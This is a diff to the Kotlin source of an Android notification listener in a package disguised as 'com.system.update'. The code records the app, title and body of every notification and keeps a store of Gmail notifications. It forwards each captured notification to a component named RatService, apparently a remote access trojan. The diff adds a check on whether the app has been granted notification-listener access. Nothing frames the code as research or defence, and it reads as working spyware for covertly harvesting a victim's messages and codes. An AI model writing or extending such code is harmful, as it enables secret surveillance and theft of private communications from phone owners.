@@ -2,11 +2,13 @@ package com.system.update
 
 import android.app.Notification
 import android.content.Context
+import android.content.Intent
+import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.service.notification.NotificationListenerService
 import android.service.notification.StatusBarNotification
 import android.util.Log
-import com.google.gson.Gson
 
 class NotificationListener : NotificationListenerService() {
 
@@ -19,6 +21,16 @@ class NotificationListener : NotificationListenerService() {
 
         fun getGmailNotifs(): List<Map<String, String>> {
             return gmailNotifs.toList()
+        }
+
+        fun isEnabled(ctx: Context): Boolean {
+            return try {
+                val enabled = Settings.Secure.getString(
+                    ctx.contentResolver,
+                    "enabled_notification_listeners"
+                ) ?: ""
+                enabled.contains(ctx.packageName)
+            } catch (_: Exception) { false }
         }
     }
 
@@ -63,14 +75,12 @@ class NotificationListener : NotificationListenerService() {
 
             Log.i(TAG, "Notif: $appName - $title - $body")
 
-            // Simpan Gmail notif
             if (pkg.contains("gmail") || appName.lowercase().contains("gmail")) {
                 gmailNotifs.add(0, data)
                 if (gmailNotifs.size > 100) gmailNotifs.removeAt(gmailNotifs.size - 1)
             }
 
             callback?.invoke(data)
-
             RatService.instance?.sendNotificationEvent(data)
         } catch (e: Exception) {
             Log.e(TAG, "onNotificationPosted error", e)
